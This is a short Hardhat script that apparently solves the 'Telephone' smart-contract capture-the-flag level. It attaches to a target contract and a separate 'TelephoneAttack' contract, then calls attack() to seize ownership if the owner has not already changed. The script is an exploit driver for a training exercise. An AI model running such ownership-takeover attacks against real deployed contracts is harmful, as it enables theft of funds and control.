import hre from "hardhat"
import { vars } from "hardhat/config"

async function main() {
    const telephoneAddress = vars.get("TELEPHONE_ADDRESS");
    const telephoneAttackAddress = vars.get("TELEPHONE_ATTACK_ADDRESS");
    const ownerAddress = vars.get("OWNER_ADDRESS");

    const Telephone = await hre.ethers.getContractFactory("Telephone");
    const telephone = Telephone.attach(telephoneAddress);

    const TelephoneAttack = await hre.ethers.getContractFactory("TelephoneAttack");
    const attack = TelephoneAttack.attach(telephoneAttackAddress);

    const telephoneOwner = await telephone.owner();
    console.log(telephoneOwner)
    console.log(await attack.telephoneContractAddress())
    if (telephoneOwner != ownerAddress) {
        console.log(await attack.attack())
    } else {
        console.log("Already succesfully attacked!")
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});